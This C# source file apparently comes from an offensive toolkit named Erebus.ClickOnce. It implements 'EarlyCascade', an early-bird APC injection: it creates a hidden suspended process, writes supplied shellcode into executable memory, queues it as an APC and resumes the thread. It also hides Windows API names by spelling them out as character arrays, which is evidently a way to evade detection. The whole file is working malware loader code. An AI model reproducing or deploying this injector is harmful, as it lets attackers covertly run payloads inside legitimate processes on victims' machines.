using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using Erebus.ClickOnce.Evasion;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class EarlyCascadeInjection : IInjectionMethod
    {
        public string Name => "EarlyCascade";
        public string Description => "Early bird APC injection into suspended process";

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate IntPtr FnOp(uint processAccess, bool bInheritHandle, int processId);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate IntPtr FnOt(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnQua(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnRt(IntPtr hThread);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
        private delegate uint FnQat(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        private static readonly Lazy<FnOp> _openProcess =
            DynamicApi.LazyDelegate<FnOp>(DynamicApi.Kernel32,
                new[] { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' });
        private static readonly Lazy<FnOt> _openThread =
            DynamicApi.LazyDelegate<FnOt>(DynamicApi.Kernel32,
                new[] { 'O', 'p', 'e', 'n', 'T', 'h', 'r', 'e', 'a', 'd' });
        private static readonly Lazy<FnQua> _queueUserAPC =
            DynamicApi.LazyDelegate<FnQua>(DynamicApi.Kernel32,
                new[] { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C' });
        private static readonly Lazy<FnRt> _resumeThread =
            DynamicApi.LazyDelegate<FnRt>(DynamicApi.Kernel32,
                new[] { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd' });
        private static readonly Lazy<FnQat> _ntQueueApcThread =
            DynamicApi.LazyDelegate<FnQat>(DynamicApi.Ntdll,
                new[] { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd' });

        private static IntPtr DoOpenProc(uint a, bool b, int c)      => _openProcess.Value(a, b, c);
        private static IntPtr DoOpenThread(uint a, bool b, uint c)      => _openThread.Value(a, b, c);
        private static uint   DoQueueApc(IntPtr a, IntPtr b, IntPtr c) => _queueUserAPC.Value(a, b, c);
        private static uint   DoResume(IntPtr h)                  => _resumeThread.Value(h);
        private static uint   DoQueueApcNt(IntPtr t, IntPtr r, IntPtr a1, IntPtr a2, IntPtr a3)
            => _ntQueueApcThread.Value(t, r, a1, a2, a3);

        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint THREAD_ALL_ACCESS = 0x1F03FF;

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                string targetProcess = InjectionConfig.TargetProcess;

                // Start target process in suspended state
                Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                Win32.PROCESS_INFORMATION pi;

                DebugLogger.WriteLine($"[+] Creating suspended process: {targetProcess}");

                // Mutable command line buffer required for CreateProcessW
                StringBuilder cmdLine = new StringBuilder(targetProcess);

                bool success = Win32.CreateProcess(
                    null!,
                    cmdLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    Win32.CREATION_FLAGS.CREATE_SUSPENDED | Win32.CREATION_FLAGS.CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    null!,
                    ref si,
                    out pi);

                if (!success)
                {
                    DebugLogger.WriteLine($"[-] Failed to create process: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                DebugLogger.WriteLine($"[+] Process created with PID: {pi.dwProcessId}");

                // Allocate memory in target process
                IntPtr baseAddress = Win32.DoAllocEx(
                    (Win32.HANDLE)pi.hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] alloc step failed: {Marshal.GetLastWin32Error()}");
                    Win32.CloseHandle(pi.hProcess);
                    Win32.CloseHandle(pi.hThread);
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Write shellcode to target process
                unsafe
                {
                    fixed (byte* pShellcode = shellcode)
                    {
                        nuint written = 0;
                        Win32.BOOL writeResult = Win32.DoWriteMem(
                            (Win32.HANDLE)pi.hProcess,
                            (void*)baseAddress,
                            pShellcode,
                            (nuint)shellcode.Length,
                            &written);

                        if (!writeResult)
                        {
                            DebugLogger.WriteLine($"[-] write step failed: {Marshal.GetLastWin32Error()}");
                            Win32.CloseHandle(pi.hProcess);
                            Win32.CloseHandle(pi.hThread);
                            return false;
                        }

                        DebugLogger.WriteLine($"[+] Written {written} bytes to target process");
                    }
                }

                // Queue APC to main thread (Early Bird)
                DebugLogger.WriteLine("[+] Queueing APC to main thread...");
                uint apcResult = DoQueueApc(baseAddress, pi.hThread, IntPtr.Zero);

                if (apcResult == 0)
                {
                    DebugLogger.WriteLine($"[-] apc-queue step failed: {Marshal.GetLastWin32Error()}");
                    Win32.CloseHandle(pi.hProcess);
                    Win32.CloseHandle(pi.hThread);
                    return false;
                }

                // Resume thread to execute APC
                DebugLogger.WriteLine("[+] Resuming thread...");
                DoResume(pi.hThread);

                // Cleanup handles
                Win32.CloseHandle(pi.hThread);
                Win32.CloseHandle(pi.hProcess);

                DebugLogger.WriteLine("[+] EarlyCascade injection completed successfully");
                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] EarlyCascade injection failed: {ex.Message}");
                return false;
            }
        }
    }
}